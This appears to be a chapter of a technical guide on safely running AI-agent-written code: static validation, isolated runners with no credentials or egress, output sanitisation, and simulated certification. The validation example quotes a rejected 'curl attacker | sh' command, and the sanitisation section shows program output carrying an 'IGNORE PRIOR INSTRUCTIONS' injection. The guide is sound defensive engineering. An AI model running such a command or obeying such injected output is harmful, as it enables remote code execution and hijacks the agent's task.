Orientation

Letting an agent run code it wrote is the highest-leverage and highest-risk capability in the platform. High-leverage because one program can do what twenty tool calls cannot — join, aggregate, transform data at machine speed (chapter 1, code-as-action). High-risk because model-written code is untrusted code, and running untrusted code is the oldest security problem there is.

The whole discipline reduces to one principle: the sandbox must assume the code is hostile. Not "probably fine" — hostile. Every control below (static validation, isolation, no ambient credentials, egress denial, resource caps, output sanitisation) exists because any one of them failing alone should not give away the cluster.

The sandbox

Static code validation

Before execution, inspect the code: which imports, which syscalls, which resources — and reject anything outside an allowlist. A filter, not the boundary.

Mechanism

The validator parses the generated code and checks it against a policy: allowed imports, forbidden operations (network, filesystem outside a workspace, subprocess), and resource declarations. It rejects obvious danger before the code runs — but it is explicitly a filter, because dynamic construction can evade static analysis, which is why isolation (below) is the real boundary.

Worked example

generated  import pandas; df = load_csv(...); print(df.duplicated().sum())
validate   pandas allowed · no network · no fs writes outside /tmp/work · ok
generated  import os; os.system("curl attacker | sh")
validate   os.system + network → REJECTED before execution

At production scale

Static validation catches the easy cases cheaply and gives you an audit record of what was rejected. But never rely on it as the boundary — a determined payload builds the dangerous call dynamically. Its job is to reduce what reaches the sandbox, not to be the sandbox. Full context in chapter 1's code-as-action concept.

Failure modes

  • Validation as the only defence. Evadable by dynamic construction.
  • Allowlist too broad. Dangerous imports permitted.

Choose it when

  • Always, as the first filter — never as the only one.

Isolated execution runners

The real boundary: code runs in an isolated worker — local sandbox or Kubernetes pod — with no ambient credentials, denied egress, and hard resource caps.

Mechanism

The runner executes the validated code in isolation, with a filesystem policy (writes confined to a workspace), a network policy (egress denied by default), CPU/memory/time caps, and — critically — no credentials in the environment. Multiple runner backends (local for dev, Kubernetes for production, a fake for tests) implement one interface. The isolation is the boundary that makes a validation miss survivable.

Worked example

runner executes the dedup program
 filesystem  writes only to /tmp/work
 network     egress denied (the code cannot phone home)
 resources   cpu 2s, mem 512MB, wall 5s
 credentials NONE in the environment
even if the code were malicious, it has nothing to steal and nowhere to send

At production scale

Run the sandbox as its own workload class with its own autoscaling — code execution is CPU/GPU-bound and bursty while agent workers are IO-bound, and mixing them makes both scale badly (chapter 32). The no-credentials rule is the single most important control: an agent that needs data should be handed the data (fetched by a governed tool) rather than the credentials to fetch it, so the sandbox never holds a secret.

Failure modes

  • Credentials in the sandbox. The catastrophic mistake.
  • Egress allowed by default. Exfiltration path.
  • No resource caps. A crypto-miner or a fork bomb.

Choose it when

  • Always, if you run model-written code at all.

Observation sanitisation and the envelope

What comes back from the sandbox is untrusted: truncate it, redact it, mark it, and never let a program's output flood the context or smuggle an instruction.

Mechanism

The runner returns an observation envelope; a sanitizer truncates large output (keeping head and tail with a marker), redacts anything sensitive, and marks the whole as untrusted before it reaches the model. Large results are returned as artifacts by reference rather than inline (chapter 8). This closes the loop safely: the program did the work, but its output cannot overflow the window or act as an injection vector.

program prints a 40MB table + "IGNORE PRIOR INSTRUCTIONS..."

At production scale

Silent truncation is the subtle bug: a program prints partial results, the sanitizer cuts them, and the model concludes from a fragment believing it is whole — so the truncation must be marked. Returning large output as artifacts keeps both the context and the cost bounded. And marking output untrusted is the same discipline as tool output (chapter 12): the sandbox is just another source of untrusted content.

Failure modes

  • Silent truncation. Reasoning over a fragment as if whole.
  • Output trusted. An injection from the program's own output.
  • Unbounded inline output. Context and cost blowout.

Choose it when

  • Always, between the sandbox and the model.

Sandbox simulation and certification

Before a code-capable strategy or a connector runs for real, exercise it in a simulated sandbox — mock tools, no real side effects — to certify it behaves safely.

Mechanism

A simulation runner executes a strategy or trajectory against mock tools and a sandboxed environment, so its behaviour can be observed without real side effects — the mock-tool sandbox of chapter 31. Certification runs this before promotion: a code-capable strategy must demonstrate it stays within policy under simulation before it is allowed near real systems. It is the testing counterpart to the runtime isolation.

Worked example

a new code-capable strategy
 simulation runner: run it against mock tools, sandboxed
 observe: does it attempt egress? exceed caps? call forbidden tools?
 certification: passes policy under simulation → cleared for real use
 → uncertified strategies stay in the sandbox

At production scale

Simulation-then-certification is how you offer a catalogue of code-capable strategies safely: each is proven under mock conditions before it touches real systems. The sandbox trace is the evidence. This connects to the broader certification story (chapter 10) — a code-capable strategy is exactly the kind of thing that must be gated behind evidence, not trust.

Failure modes

  • Certification without simulation. A paper exercise.
  • Mocks that diverge from reality. Passing simulation, failing in production.

Choose it when

  • Any code-capable strategy or connector before production use.

What is missing here

  • Hardware-level isolation options. The runners isolate at the process/pod level; stronger isolation (microVMs, gVisor) for the highest-risk tenants is future work.
  • Language breadth. The policy machinery centres on Python; other languages would need their own validators and policies.
  • Deterministic replay of executions. Non-determinism (clock, randomness) makes a code execution hard to replay exactly for audit.
  • Egress allowlisting. Egress is denied by default; a governed allowlist for the rare case a program legitimately needs a specific endpoint is thin.
